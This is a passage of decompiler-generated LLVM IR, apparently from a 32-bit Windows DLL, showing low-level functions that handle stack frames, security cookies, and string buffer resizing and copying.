  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2181
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !2182
  %3 = add i32 %arg4, 20, !insn.addr !2183
  %4 = inttoptr i32 %3 to i32*, !insn.addr !2183
  %5 = load i32, i32* %4, align 4, !insn.addr !2183
  %6 = and i32 %5, 16384, !insn.addr !2183
  %7 = icmp eq i32 %6, 0, !insn.addr !2183
  %8 = icmp eq i1 %7, false, !insn.addr !2184
  br i1 %8, label %dec_label_pc_10004df1, label %dec_label_pc_10004dd5, !insn.addr !2184

dec_label_pc_10004dd5:                            ; preds = %dec_label_pc_10004d90
  store i8 %arg6, i8* %stack_var_-112, align 1, !insn.addr !2185
  %9 = sext i8 %arg5 to i32, !insn.addr !2186
  store i32 %9, i32* %stack_var_-116, align 4, !insn.addr !2186
  br label %dec_label_pc_10004f48, !insn.addr !2187

dec_label_pc_10004df1:                            ; preds = %dec_label_pc_10004d90
  %10 = ptrtoint i32* %stack_var_-88 to i32, !insn.addr !2188
  %11 = trunc i32 %10 to i8, !insn.addr !2188
  store i8 %11, i8* %stack_var_-112, align 1, !insn.addr !2188
  store i32 %10, i32* %stack_var_-116, align 4, !insn.addr !2189
  %sext = mul i32 %10, 16777216
  %12 = sdiv i32 %sext, 16777216, !insn.addr !2190
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2190
  %14 = call i32 @function_10006dc0(i32* nonnull %stack_var_-88, i32* %13), !insn.addr !2190
  %15 = ptrtoint i8* %stack_var_-112 to i32, !insn.addr !2191
  %16 = icmp eq i32 %0, 0, !insn.addr !2192
  %17 = icmp eq i32 %14, 0, !insn.addr !2193
  %or.cond = or i1 %16, %17
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !2194
  br i1 %or.cond, label %dec_label_pc_10004e2f, label %dec_label_pc_10004e27, !insn.addr !2194

dec_label_pc_10004e27:                            ; preds = %dec_label_pc_10004df1
  store i32 1, i32* %stack_var_-116, align 4, !insn.addr !2195
  %18 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2195
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !2196
  br label %dec_label_pc_10004e2f, !insn.addr !2196

dec_label_pc_10004e2f:                            ; preds = %dec_label_pc_10004e27, %dec_label_pc_10004df1
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  store i128 0, i128* %stack_var_-44, align 8, !insn.addr !2197
  %19 = icmp eq i8 %arg6, 0, !insn.addr !2198
  %20 = add i32 %esp.0.reload, -4, !insn.addr !2199
  %21 = inttoptr i32 %20 to i32*, !insn.addr !2199
  %22 = ptrtoint i32* %stack_var_-68 to i32, !insn.addr !2199
  store i32 %22, i32* %21, align 4, !insn.addr !2199
  %23 = load i128, i128* %stack_var_-44, align 8
  %24 = trunc i128 %23 to i8
  br i1 %19, label %dec_label_pc_10004e5b, label %dec_label_pc_10004e54, !insn.addr !2200

dec_label_pc_10004e54:                            ; preds = %dec_label_pc_10004e2f
  %25 = call i32 @function_10005410(i8 %24), !insn.addr !2201
  store i32 %25, i32* %storemerge5.reg2mem, !insn.addr !2202
  br label %dec_label_pc_10004e60, !insn.addr !2202

dec_label_pc_10004e5b:                            ; preds = %dec_label_pc_10004e2f
  %26 = call i32 @function_10005430(i8 %24), !insn.addr !2203
  store i32 %26, i32* %storemerge5.reg2mem, !insn.addr !2203
  br label %dec_label_pc_10004e60, !insn.addr !2203

dec_label_pc_10004e60:                            ; preds = %dec_label_pc_10004e5b, %dec_label_pc_10004e54
  %storemerge5.reload = load i32, i32* %storemerge5.reg2mem
  %27 = ptrtoint i128* %stack_var_-44 to i32, !insn.addr !2204
  %28 = icmp eq i32 %storemerge5.reload, %27, !insn.addr !2205
  br i1 %28, label %dec_label_pc_10004e92, label %dec_label_pc_10004e69, !insn.addr !2206

dec_label_pc_10004e69:                            ; preds = %dec_label_pc_10004e60
  %29 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !2207
  %30 = inttoptr i32 %storemerge5.reload to i128*, !insn.addr !2208
  %31 = load i128, i128* %30, align 4, !insn.addr !2208
  %32 = call i128 @__asm_movups.35(i128 %31), !insn.addr !2208
  call void @__asm_movups(i128 undef, i128 %32), !insn.addr !2209
  %33 = add i32 %storemerge5.reload, 16, !insn.addr !2210
  %34 = inttoptr i32 %33 to i64*, !insn.addr !2210
  %35 = load i64, i64* %34, align 4, !insn.addr !2210
  %36 = call i128 @__asm_movq(i64 %35), !insn.addr !2210
  %37 = inttoptr i32 %33 to i32*, !insn.addr !2211
  store i32 0, i32* %37, align 4, !insn.addr !2211
  %38 = add i32 %storemerge5.reload, 20, !insn.addr !2212
  %39 = inttoptr i32 %38 to i32*, !insn.addr !2212
  store i32 15, i32* %39, align 4, !insn.addr !2212
  call void @__asm_movq.31(i64 0, i128 %36), !insn.addr !2213
  %40 = inttoptr i32 %storemerge5.reload to i8*, !insn.addr !2214
  store i8 0, i8* %40, align 1, !insn.addr !2214
  br label %dec_label_pc_10004e92, !insn.addr !2214

dec_label_pc_10004e92:                            ; preds = %dec_label_pc_10004e69, %dec_label_pc_10004e60
  %41 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !2215
  %42 = add i32 %arg4, 36, !insn.addr !2216
  %43 = inttoptr i32 %42 to i32*, !insn.addr !2216
  %44 = load i32, i32* %43, align 4, !insn.addr !2216
  %45 = icmp slt i32 %44, 0, !insn.addr !2216
  store i32 0, i32* %storemerge.reg2mem, !insn.addr !2217
  br i1 %45, label %dec_label_pc_10004eb8, label %dec_label_pc_10004ea0, !insn.addr !2217

dec_label_pc_10004ea0:                            ; preds = %dec_label_pc_10004e92
  %.pre31 = add i32 %arg4, 32
  %.pre33 = inttoptr i32 %.pre31 to i32*
  %.pre35 = load i32, i32* %.pre33, align 4
  %46 = or i32 %44, %.pre35
  %47 = icmp eq i32 %46, 0
  %spec.select = select i1 %47, i32 0, i32 %.pre35
  store i32 %spec.select, i32* %storemerge.reg2mem
  br label %dec_label_pc_10004eb8

dec_label_pc_10004eb8:                            ; preds = %dec_label_pc_10004ea0, %dec_label_pc_10004e92
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %48 = load i32, i32* %4, align 4, !insn.addr !2218
  %49 = and i32 %48, 448, !insn.addr !2219
  %50 = icmp eq i32 %49, 64, !insn.addr !2220
  %.pre = add i32 %esp.0.reload, -8
  %.pre7 = inttoptr i32 %.pre to i32*
  br i1 %50, label %dec_label_pc_10004eb8.dec_label_pc_10004ef3_crit_edge, label %dec_label_pc_10004ec5, !insn.addr !2221

dec_label_pc_10004eb8.dec_label_pc_10004ef3_crit_edge: ; preds = %dec_label_pc_10004eb8
  %.pre9 = add i32 %esp.0.reload, -12, !insn.addr !2222
  %.pre11 = inttoptr i32 %.pre9 to i32*, !insn.addr !2222
  %.pre13 = add i32 %esp.0.reload, -16, !insn.addr !2223
  %.pre15 = inttoptr i32 %.pre13 to i32*, !insn.addr !2223
  %.pre17 = add i32 %esp.0.reload, -20, !insn.addr !2224
  %.pre19 = inttoptr i32 %.pre17 to i32*, !insn.addr !2224
  %.pre21 = add i32 %esp.0.reload, -24, !insn.addr !2225
  %.pre23 = inttoptr i32 %.pre21 to i32*, !insn.addr !2225
  %.pre25 = add i32 %esp.0.reload, -28, !insn.addr !2226
  %.pre27 = inttoptr i32 %.pre25 to i32*, !insn.addr !2226
  %.pre29 = sext i8 %arg5 to i32, !insn.addr !2227
  store i32 %.pre29, i32* %.pre-phi30.reg2mem
  store i32* %.pre27, i32** %.pre-phi28.reg2mem
  store i32* %.pre23, i32** %.pre-phi24.reg2mem
  store i32* %.pre19, i32** %.pre-phi20.reg2mem
  store i32* %.pre15, i32** %.pre-phi16.reg2mem
  store i32* %.pre11, i32** %.pre-phi12.reg2mem
  store i32 %arg2, i32* %ecx.0.reg2mem
  store i32 %arg3, i32* %edx.0.reg2mem
  store i32 %storemerge.reload, i32* %edi.0.reg2mem
  br label %dec_label_pc_10004ef3

dec_label_pc_10004ec5:                            ; preds = %dec_label_pc_10004eb8
  store i32 %storemerge.reload, i32* %.pre7, align 4, !insn.addr !2228
  %51 = sext i8 %arg5 to i32
  %52 = add i32 %esp.0.reload, -12
  %53 = inttoptr i32 %52 to i32*
  store i32 %51, i32* %53, align 4, !insn.addr !2229
  %54 = add i32 %esp.0.reload, -16
  %55 = inttoptr i32 %54 to i32*
  store i32 %arg3, i32* %55, align 4, !insn.addr !2230
  %56 = add i32 %esp.0.reload, -20
  %57 = inttoptr i32 %56 to i32*
  store i32 %arg2, i32* %57, align 4, !insn.addr !2231
  %58 = add i32 %esp.0.reload, -24
  %59 = inttoptr i32 %58 to i32*
  store i32 %10, i32* %59, align 4, !insn.addr !2232
  %60 = add i32 %esp.0.reload, -28
  %61 = inttoptr i32 %60 to i32*
  %62 = call i32 @function_100054a0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2233
  %63 = inttoptr i32 %62 to i32*, !insn.addr !2234
  %64 = load i32, i32* %63, align 4, !insn.addr !2234
  %65 = add i32 %62, 4, !insn.addr !2235
  %66 = inttoptr i32 %65 to i32*, !insn.addr !2235
  %67 = load i32, i32* %66, align 4, !insn.addr !2235
  store i32 %51, i32* %.pre-phi30.reg2mem, !insn.addr !2236
  store i32* %61, i32** %.pre-phi28.reg2mem, !insn.addr !2236
  store i32* %59, i32** %.pre-phi24.reg2mem, !insn.addr !2236
  store i32* %57, i32** %.pre-phi20.reg2mem, !insn.addr !2236
  store i32* %55, i32** %.pre-phi16.reg2mem, !insn.addr !2236
  store i32* %53, i32** %.pre-phi12.reg2mem, !insn.addr !2236
  store i32 %64, i32* %ecx.0.reg2mem, !insn.addr !2236
  store i32 %67, i32* %edx.0.reg2mem, !insn.addr !2236
  store i32 0, i32* %edi.0.reg2mem, !insn.addr !2236
  br label %dec_label_pc_10004ef3, !insn.addr !2236

dec_label_pc_10004ef3:                            ; preds = %dec_label_pc_10004eb8.dec_label_pc_10004ef3_crit_edge, %dec_label_pc_10004ec5
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %.pre-phi12.reload = load i32*, i32** %.pre-phi12.reg2mem
  %.pre-phi16.reload = load i32*, i32** %.pre-phi16.reg2mem
  %.pre-phi20.reload = load i32*, i32** %.pre-phi20.reg2mem
  %.pre-phi24.reload = load i32*, i32** %.pre-phi24.reg2mem
  %.pre-phi28.reload = load i32*, i32** %.pre-phi28.reg2mem
  %.pre-phi30.reload = load i32, i32* %.pre-phi30.reg2mem
  store i32 0, i32* %.pre7, align 4, !insn.addr !2237
  store i32 %27, i32* %.pre-phi12.reload, align 4, !insn.addr !2222
  store i32 %edx.0.reload, i32* %.pre-phi16.reload, align 4, !insn.addr !2223
  store i32 %ecx.0.reload, i32* %.pre-phi20.reload, align 4, !insn.addr !2224
  %68 = ptrtoint i32* %stack_var_-96 to i32, !insn.addr !2225
  store i32 %68, i32* %.pre-phi24.reload, align 4, !insn.addr !2225
  %69 = call i32 @function_10005510(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2238
  %70 = add i32 %esp.0.reload, -32, !insn.addr !2239
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2239
  store i32 %edi.0.reload, i32* %71, align 4, !insn.addr !2239
  %72 = add i32 %esp.0.reload, -36, !insn.addr !2227
  %73 = inttoptr i32 %72 to i32*, !insn.addr !2227
  store i32 %.pre-phi30.reload, i32* %73, align 4, !insn.addr !2227
  %74 = inttoptr i32 %69 to i32*, !insn.addr !2240
  %75 = load i32, i32* %74, align 4, !insn.addr !2240
  %76 = add i32 %69, 4, !insn.addr !2241
  %77 = inttoptr i32 %76 to i32*, !insn.addr !2241
  %78 = load i32, i32* %77, align 4, !insn.addr !2241
  %79 = add i32 %esp.0.reload, -40, !insn.addr !2242
  %80 = inttoptr i32 %79 to i32*, !insn.addr !2242
  store i32 %78, i32* %80, align 4, !insn.addr !2242
  %81 = add i32 %esp.0.reload, -44, !insn.addr !2243
  %82 = inttoptr i32 %81 to i32*, !insn.addr !2243
  store i32 %75, i32* %82, align 4, !insn.addr !2243
  %83 = add i32 %arg4, 32, !insn.addr !2244
  %84 = inttoptr i32 %83 to i32*, !insn.addr !2244
  store i32 0, i32* %84, align 4, !insn.addr !2244
  store i32 0, i32* %43, align 4, !insn.addr !2245
  %85 = add i32 %esp.0.reload, -48, !insn.addr !2246
  %86 = inttoptr i32 %85 to i32*, !insn.addr !2246
  store i32 %arg1, i32* %86, align 4, !insn.addr !2246
  %87 = add i32 %esp.0.reload, -52, !insn.addr !2247
  %88 = inttoptr i32 %87 to i32*, !insn.addr !2247
  %89 = call i32 @function_100054a0(i32 %75, i32 %78, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2248
  %90 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !2249
  br label %dec_label_pc_10004f48, !insn.addr !2250

dec_label_pc_10004f48:                            ; preds = %dec_label_pc_10004ef3, %dec_label_pc_10004dd5
  %91 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2251
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !2252
  %92 = call i32 @"@__security_check_cookie@4"(), !insn.addr !2253
  ret i32 %92, !insn.addr !2254
}

define i32 @function_10004f70(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004f70:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !2255
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = call i32 @"?_Xinvalid_argument@std@@YAXPBD@Z"(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10039390, i32 0, i32 0)), !insn.addr !2256
  %5 = call i32 @__asm_int3(), !insn.addr !2257
  %6 = call i32 @__asm_int3(), !insn.addr !2258
  %7 = call i32 @__asm_int3(), !insn.addr !2259
  %8 = call i32 @__asm_int3(), !insn.addr !2260
  %9 = call i32 @__asm_int3(), !insn.addr !2261
  %10 = call i32 @__asm_int3(), !insn.addr !2262
  %11 = icmp eq i32 %arg1, -1, !insn.addr !2263
  br i1 %11, label %dec_label_pc_1000501e, label %dec_label_pc_10004f93, !insn.addr !2264

dec_label_pc_10004f93:                            ; preds = %dec_label_pc_10004f70
  %12 = icmp eq i32 %arg1, 0, !insn.addr !2265
  %13 = icmp eq i1 %12, false, !insn.addr !2266
  br i1 %13, label %dec_label_pc_10004fb8, label %dec_label_pc_10004f97, !insn.addr !2266

dec_label_pc_10004f97:                            ; preds = %dec_label_pc_10004f93
  %14 = add i32 %3, 16, !insn.addr !2267
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2267
  store i32 %arg1, i32* %15, align 4, !insn.addr !2267
  %16 = inttoptr i32 %3 to i8*
  store i8 0, i8* %16, align 1
  ret i32 %3, !insn.addr !2268

dec_label_pc_10004fb8:                            ; preds = %dec_label_pc_10004f93
  %17 = add i32 %3, 20
  %18 = inttoptr i32 %17 to i32*
  %19 = load i32, i32* %18, align 4
  %20 = icmp ult i32 %19, %arg1, !insn.addr !2269
  %21 = icmp eq i1 %20, false, !insn.addr !2270
  store i32* %stack_var_-16, i32** %esp.0.in.reg2mem, !insn.addr !2270
  br i1 %21, label %dec_label_pc_10004fc3, label %dec_label_pc_10004fbd, !insn.addr !2270

dec_label_pc_10004fbd:                            ; preds = %dec_label_pc_10004fb8
  store i32 %arg1, i32* %stack_var_-20, align 4, !insn.addr !2271
  %22 = call i32 @function_10005f40(i32 %arg1, i32 %0, i32 %1, i32 %2), !insn.addr !2272
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !2272
  br label %dec_label_pc_10004fc3, !insn.addr !2272

dec_label_pc_10004fc3:                            ; preds = %dec_label_pc_10004fbd, %dec_label_pc_10004fb8
  %sext = mul i32 %arg2, 16777216
  %23 = sdiv i32 %sext, 16777216
  %24 = icmp eq i32 %arg1, 1, !insn.addr !2273
  %25 = icmp eq i1 %24, false, !insn.addr !2274
  br i1 %25, label %dec_label_pc_10004fe0, label %dec_label_pc_10004fc8, !insn.addr !2274

dec_label_pc_10004fc8:                            ; preds = %dec_label_pc_10004fc3
  %26 = trunc i32 %23 to i8
  %27 = inttoptr i32 %3 to i8*
  store i8 %26, i8* %27, align 1
  br label %dec_label_pc_10004ffb, !insn.addr !2275

dec_label_pc_10004fe0:                            ; preds = %dec_label_pc_10004fc3
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %28 = add i32 %esp.0, -4, !insn.addr !2276
  %29 = inttoptr i32 %28 to i32*, !insn.addr !2276
  store i32 %arg1, i32* %29, align 4, !insn.addr !2276
  %30 = add i32 %esp.0, -8, !insn.addr !2277
  %31 = inttoptr i32 %30 to i32*, !insn.addr !2277
  store i32 %23, i32* %31, align 4, !insn.addr !2277
  %32 = add i32 %esp.0, -12, !insn.addr !2278
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2278
  %34 = call i32* @_memset(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2279
  br label %dec_label_pc_10004ffb, !insn.addr !2280

dec_label_pc_10004ffb:                            ; preds = %dec_label_pc_10004fc8, %dec_label_pc_10004fe0
  %35 = add i32 %3, 16, !insn.addr !2281
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2281
  store i32 %arg1, i32* %36, align 4, !insn.addr !2281
  %37 = add i32 %3, %arg1
  %38 = inttoptr i32 %37 to i8*
  store i8 0, i8* %38, align 1
  ret i32 %3, !insn.addr !2282

dec_label_pc_1000501e:                            ; preds = %dec_label_pc_10004f70
  %39 = call i32 @function_10004f70(i32 %0, i32 %1), !insn.addr !2283
  %40 = call i32 @__asm_int3(), !insn.addr !2284
  %41 = call i32 @__asm_int3(), !insn.addr !2285
  %42 = call i32 @__asm_int3(), !insn.addr !2286
  %43 = call i32 @__asm_int3(), !insn.addr !2287
  %44 = call i32 @__asm_int3(), !insn.addr !2288
  %45 = call i32 @__asm_int3(), !insn.addr !2289
  %46 = call i32 @__asm_int3(), !insn.addr !2290
  %47 = call i32 @__asm_int3(), !insn.addr !2291
  %48 = call i32 @__asm_int3(), !insn.addr !2292
  %49 = call i32 @__asm_int3(), !insn.addr !2293
  %50 = call i32 @__asm_int3(), !insn.addr !2294
  %51 = call i32 @__asm_int3(), !insn.addr !2295
  %52 = call i32 @__asm_int3(), !insn.addr !2296
  ret i32 %52, !insn.addr !2296
}

define i32 @function_10005030(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10005030:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !2297
  %ecx.0.reg2mem = alloca i32, !insn.addr !2297
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 20, !insn.addr !2298
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2298
  %6 = load i32, i32* %5, align 4, !insn.addr !2298
  %7 = icmp ult i32 %6, 16, !insn.addr !2299
  %storemerge2 = select i1 %7, i32 %3, i32 %6
  %8 = icmp ugt i32 %storemerge2, %arg1
  br i1 %8, label %dec_label_pc_10005086, label %dec_label_pc_1000504c, !insn.addr !2300

dec_label_pc_1000504c:                            ; preds = %dec_label_pc_10005030
  %9 = add i32 %3, 16, !insn.addr !2301
  %10 = inttoptr i32 %9 to i32*, !insn.addr !2301
  %11 = load i32, i32* %10, align 4, !insn.addr !2301
  %12 = add i32 %11, %storemerge2, !insn.addr !2302
  %13 = icmp ugt i32 %12, %arg1, !insn.addr !2303
  %14 = icmp eq i1 %13, false, !insn.addr !2304
  br i1 %14, label %dec_label_pc_10005086, label %dec_label_pc_10005055, !insn.addr !2304

dec_label_pc_10005055:                            ; preds = %dec_label_pc_1000504c
  %15 = trunc i32 %1 to i8, !insn.addr !2305
  store i32 %arg2, i32* %stack_var_-16, align 4
  br i1 %7, label %dec_label_pc_10005070, label %dec_label_pc_1000505a, !insn.addr !2306

dec_label_pc_1000505a:                            ; preds = %dec_label_pc_10005055
  %16 = sub i32 %arg1, %6, !insn.addr !2307
  store i32 %16, i32* %stack_var_-20, align 4, !insn.addr !2308
  %17 = call i32 @function_100060a0(i32 %3, i32 %16, i32 %arg2, i8 %15), !insn.addr !2309
  ret i32 %17, !insn.addr !2310

dec_label_pc_10005070:                            ; preds = %dec_label_pc_10005055
  %18 = sub i32 %arg1, %3, !insn.addr !2311
  store i32 %18, i32* %stack_var_-20, align 4, !insn.addr !2312
  %19 = call i32 @function_100060a0(i32 %3, i32 %18, i32 %arg2, i8 %15), !insn.addr !2313
  ret i32 %19, !insn.addr !2314

dec_label_pc_10005086:                            ; preds = %dec_label_pc_10005030, %dec_label_pc_1000504c
  %20 = icmp eq i32 %arg2, 0, !insn.addr !2315
  %21 = icmp eq i1 %20, false, !insn.addr !2316
  br i1 %21, label %dec_label_pc_100050b0, label %dec_label_pc_1000508e, !insn.addr !2316

dec_label_pc_1000508e:                            ; preds = %dec_label_pc_10005086
  %22 = add i32 %3, 16, !insn.addr !2317
  %23 = inttoptr i32 %22 to i32*, !insn.addr !2317
  store i32 %arg2, i32* %23, align 4, !insn.addr !2317
  br i1 %7, label %dec_label_pc_100050a4, label %dec_label_pc_10005096, !insn.addr !2318

dec_label_pc_10005096:                            ; preds = %dec_label_pc_1000508e
  %24 = inttoptr i32 %6 to i8*, !insn.addr !2319
  store i8 0, i8* %24, align 1, !insn.addr !2319
  ret i32 %3, !insn.addr !2320

dec_label_pc_100050a4:                            ; preds = %dec_label_pc_1000508e
  %25 = inttoptr i32 %3 to i8*, !insn.addr !2321
  store i8 0, i8* %25, align 1, !insn.addr !2321
  ret i32 %3, !insn.addr !2322

dec_label_pc_100050b0:                            ; preds = %dec_label_pc_10005086
  %26 = icmp ult i32 %6, %arg2, !insn.addr !2323
  %27 = icmp eq i1 %26, false, !insn.addr !2324
  store i32 %6, i32* %ecx.0.reg2mem, !insn.addr !2324
  store i32* %stack_var_-16, i32** %esp.0.in.reg2mem, !insn.addr !2324
  br i1 %27, label %dec_label_pc_100050bc, label %dec_label_pc_100050b4, !insn.addr !2324

dec_label_pc_100050b4:                            ; preds = %dec_label_pc_100050b0
  store i32 %arg2, i32* %stack_var_-20, align 4, !insn.addr !2325
  %sext = mul i32 %1, 16777216
  %28 = sdiv i32 %sext, 16777216, !insn.addr !2326
  %29 = call i32 @function_10005f40(i32 %arg2, i32 %0, i32 %28, i32 %2), !insn.addr !2326
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !2326
  br label %dec_label_pc_100050bc, !insn.addr !2326

dec_label_pc_100050bc:                            ; preds = %dec_label_pc_100050b4, %dec_label_pc_100050b0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %30 = load i32, i32* %5, align 4, !insn.addr !2327
  %31 = icmp ult i32 %30, 16, !insn.addr !2327
  %storemerge = select i1 %31, i32 %3, i32 %ecx.0.reload
  %32 = add i32 %esp.0, -4, !insn.addr !2328
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2328
  store i32 %arg2, i32* %33, align 4, !insn.addr !2328
  %34 = add i32 %esp.0, -8, !insn.addr !2329
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2329
  store i32 %arg1, i32* %35, align 4, !insn.addr !2329
  %36 = add i32 %esp.0, -12, !insn.addr !2330
  %37 = inttoptr i32 %36 to i32*, !insn.addr !2330
  store i32 %storemerge, i32* %37, align 4, !insn.addr !2330
  %38 = call i32 @_memcpy.12(), !insn.addr !2331
  %39 = add i32 %3, 16, !insn.addr !2332
  %40 = inttoptr i32 %39 to i32*, !insn.addr !2332
  store i32 %arg2, i32* %40, align 4, !insn.addr !2332
  %41 = load i32, i32* %5, align 4, !insn.addr !2333
  %42 = icmp ult i32 %41, 16, !insn.addr !2333
  br i1 %42, label %dec_label_pc_100050eb, label %dec_label_pc_100050dc, !insn.addr !2334

dec_label_pc_100050dc:                            ; preds = %dec_label_pc_100050bc
  %43 = add i32 %ecx.0.reload, %arg2, !insn.addr !2335
  %44 = inttoptr i32 %43 to i8*, !insn.addr !2335
  store i8 0, i8* %44, align 1, !insn.addr !2335
  ret i32 %3, !insn.addr !2336

dec_label_pc_100050eb:                            ; preds = %dec_label_pc_100050bc
  %45 = add i32 %3, %arg2, !insn.addr !2337
  %46 = inttoptr i32 %45 to i8*, !insn.addr !2337
  store i8 0, i8* %46, align 1, !insn.addr !2337
  ret i32 %3, !insn.addr !2338
}

define i32 @function_10005100(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10005100:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !2339
  %.reg2mem = alloca i32, !insn.addr !2339
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 20, !insn.addr !2340
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2340
  %6 = load i32, i32* %5, align 4, !insn.addr !2340
  %7 = ptrtoint i8* %arg1 to i32, !insn.addr !2341
  %8 = icmp ugt i32 %3, %7
  %.pre3 = add i32 %3, 16
  %.pre4 = inttoptr i32 %.pre3 to i32*
  br i1 %8, label %dec_label_pc_10005152, label %dec_label_pc_10005118, !insn.addr !2342

dec_label_pc_10005118:                            ; preds = %dec_label_pc_10005100
  %9 = load i32, i32* %.pre4, align 4, !insn.addr !2343
  %10 = add i32 %9, %3, !insn.addr !2344
  %11 = icmp ugt i32 %10, %7, !insn.addr !2345
  %12 = icmp eq i1 %11, false, !insn.addr !2346
  br i1 %12, label %dec_label_pc_10005152, label %dec_label_pc_10005121, !insn.addr !2346

dec_label_pc_10005121:                            ; preds = %dec_label_pc_10005118
  store i32 %arg2, i32* %stack_var_-16, align 4
  %13 = sub i32 %7, %3
  store i32 %13, i32* %stack_var_-20, align 4
  %14 = trunc i32 %3 to i8
  %15 = call i32 @function_100051f0(i8 %14, i32 %13, i32 %arg2)
  ret i32 %15, !insn.addr !2347

dec_label_pc_10005152:                            ; preds = %dec_label_pc_10005100, %dec_label_pc_10005118
  %16 = load i32, i32* %.pre4, align 4, !insn.addr !2348
  %17 = sub i32 0, %16
  %18 = sub i32 %17, 1
  %19 = icmp ugt i32 %18, %arg2
  br i1 %19, label %dec_label_pc_10005161, label %dec_label_pc_100051df, !insn.addr !2349

dec_label_pc_10005161:                            ; preds = %dec_label_pc_10005152
  %20 = icmp eq i32 %arg2, 0, !insn.addr !2350
  br i1 %20, label %dec_label_pc_100051d6, label %dec_label_pc_10005167, !insn.addr !2351

dec_label_pc_10005167:                            ; preds = %dec_label_pc_10005161
  %21 = add i32 %16, %arg2, !insn.addr !2352
  %22 = icmp eq i32 %21, 0, !insn.addr !2353
  %23 = icmp eq i1 %22, false, !insn.addr !2354
  br i1 %23, label %dec_label_pc_1000518d, label %dec_label_pc_1000516b, !insn.addr !2354

dec_label_pc_1000516b:                            ; preds = %dec_label_pc_10005167
  store i32 %21, i32* %.pre4, align 4, !insn.addr !2355
  %24 = icmp ult i32 %6, 16, !insn.addr !2356
  br i1 %24, label %dec_label_pc_10005181, label %dec_label_pc_10005173, !insn.addr !2357

dec_label_pc_10005173:                            ; preds = %dec_label_pc_1000516b
  %25 = inttoptr i32 %arg2 to i8*, !insn.addr !2358
  store i8 0, i8* %25, align 1, !insn.addr !2358
  ret i32 %3, !insn.addr !2359

dec_label_pc_10005181:                            ; preds = %dec_label_pc_1000516b
  %26 = inttoptr i32 %3 to i8*, !insn.addr !2360
  store i8 0, i8* %26, align 1, !insn.addr !2360
  ret i32 %3, !insn.addr !2361

dec_label_pc_1000518d:                            ; preds = %dec_label_pc_10005167
  %27 = icmp ult i32 %6, %21, !insn.addr !2362
  %28 = icmp eq i1 %27, false, !insn.addr !2363
  store i32 %16, i32* %.reg2mem, !insn.addr !2363
  store i32* %stack_var_-16, i32** %esp.0.in.reg2mem, !insn.addr !2363
  br i1 %28, label %dec_label_pc_1000519c, label %dec_label_pc_10005191, !insn.addr !2363

dec_label_pc_10005191:                            ; preds = %dec_label_pc_1000518d
  store i32 %21, i32* %stack_var_-20, align 4, !insn.addr !2364
  %29 = call i32 @function_10005f40(i32 %21, i32 %0, i32 %1, i32 %2), !insn.addr !2365
  %.pre = load i32, i32* %.pre4, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !2366
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !2366
  br label %dec_label_pc_1000519c, !insn.addr !2366

